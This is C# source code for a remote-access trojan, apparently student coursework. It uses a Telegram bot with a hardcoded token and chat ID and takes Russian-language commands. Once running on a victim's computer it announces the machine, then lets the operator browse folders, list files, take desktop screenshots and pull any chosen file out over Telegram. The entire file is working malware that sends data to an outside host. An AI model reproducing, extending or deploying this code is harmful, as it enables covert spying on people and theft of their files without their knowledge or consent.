using CourseWork.Trojan;
using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;

namespace Trojan
{
    public class TelegramController
    {
        enum TelegrammCommand
        {
            HELP = 0,
            DIRECTORY,
            ABOVE,
            LIST,
            CD,
            SCREEN,
            DOWNLOAD
        }
        private struct TelegrammMessageSignature
        {
            public TelegrammMessageSignature(string telegrammMessage)
            {
                string[] messages = telegrammMessage.Split(' ');
                command = messages[0].Trim('/').Trim('/');
                args = messages.Skip(1).ToArray();
            }

            public string command;
            public string[] args;
        }
        private ITelegramBotClient telegramBotClient = new TelegramBotClient("5230039106:AAEPg-8W_jWdpUgqM_Mwt3kIMwHUe-2TGf4");
        private long messageId = 748423079;
        private readonly CommandReaction commandReaction = new CommandReaction();

        public void Start()
        {
            telegramBotClient.SendTextMessageAsync(messageId, string.Format("Компьютер: {0} в сети", Environment.MachineName));
            telegramBotClient.StartReceiving(
                HandleUpdateAsync,
                HandleErrorAsync,
                new ReceiverOptions { AllowedUpdates = { } },
                new CancellationTokenSource().Token
            );
        }

        private async Task HandleErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            if (exception is ApiRequestException apiRequestException)
            {
                await botClient.SendTextMessageAsync(messageId, apiRequestException.ToString());
            }
        }

        private Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            if (update.Type == UpdateType.Message)
            {
                TelegrammMessageSignature telegrammMessage = new TelegrammMessageSignature(update.Message.Text);

                if (telegrammMessage.command == TelegrammCommand.HELP.ToString()) PrintHelpInfo(botClient);
                else if (telegrammMessage.command == TelegrammCommand.DIRECTORY.ToString()) PrintCurrentDirectory(botClient);
                else if (telegrammMessage.command == TelegrammCommand.ABOVE.ToString()) GoAboveDirectory(botClient);
                else if (telegrammMessage.command == TelegrammCommand.LIST.ToString()) PrintAllFilesCurrentDirectory(botClient);
                else if (telegrammMessage.command == TelegrammCommand.CD.ToString()) GoToByPath(botClient, telegrammMessage.args);
                else if (telegrammMessage.command == TelegrammCommand.SCREEN.ToString()) MakeScreen(botClient);
                else if (telegrammMessage.command == TelegrammCommand.DOWNLOAD.ToString()) DownloadFile(botClient, telegrammMessage.args);
                else ErrorExecuteCommand(botClient);
            }

            return Task.CompletedTask;
        }

        private async void ErrorExecuteCommand(ITelegramBotClient botClient)
        {
            await botClient.SendTextMessageAsync(messageId, "Ошибка");
        }

        private async void DownloadFile(ITelegramBotClient botClient, string[] args)
        {
            if (args.Length > 0 && commandReaction.FindFileInCurrentDirectory(args[0]))
                await botClient.SendDocumentAsync(messageId, new InputOnlineFile(commandReaction.ReadFile(args[0]), args[0]));
            else
            {
                await botClient.SendTextMessageAsync(messageId, (args.Length == 0) ? "Ошибка" : "Данного файла не существует");
            }
        }

        private async void MakeScreen(ITelegramBotClient botClient)
        {
            using (var fileStream = new FileStream(commandReaction.GetScreenshotPath(), FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                await botClient.SendPhotoAsync(
                    chatId: messageId,
                    photo: new InputOnlineFile(fileStream)
                );
            }
        }

        private async void GoToByPath(ITelegramBotClient botClient, string[] args)
        {
            await botClient.SendTextMessageAsync(messageId, (args.Length == 0) ? "Ошибка"
                            : commandReaction.GoToFolder(args[0]));
        }

        private async void PrintAllFilesCurrentDirectory(ITelegramBotClient botClient)
        {
            string[] strings = commandReaction.GetDirectoryContent();
            if (strings.Length == 0)
            {
                ErrorExecuteCommand(botClient);
                return;
            }
            await botClient.SendTextMessageAsync(messageId, string.Join("\n", strings));
        }

        private async void GoAboveDirectory(ITelegramBotClient botClient)
        {
            await botClient.SendTextMessageAsync(messageId, commandReaction.AboveDirectory());
        }

        private async void PrintCurrentDirectory(ITelegramBotClient botClient)
        {
            await botClient.SendTextMessageAsync(messageId, commandReaction.CurrentDirectory);
        }

        private async void PrintHelpInfo(ITelegramBotClient botClient)
        {
            await botClient.SendTextMessageAsync(messageId,
                    "/HELP - Посмотреть текущий список команд\n" +
                    "/DIRECTORY - Текущая директория\n" +
                    "/ABOVE - Перейти на директорию выше\n" +
                    "/LIST - Получить список всех файлов в текущей директории\n" +
                    "/CD *Имя директории* - Перейти в указанную директорию\n" +
                    "/DOWNLOAD *Имя файла* - Скачать указанный файл\n" +
                    "/SCREEN - делает скриншот рабочего стола\n"
                );
        }
    }
}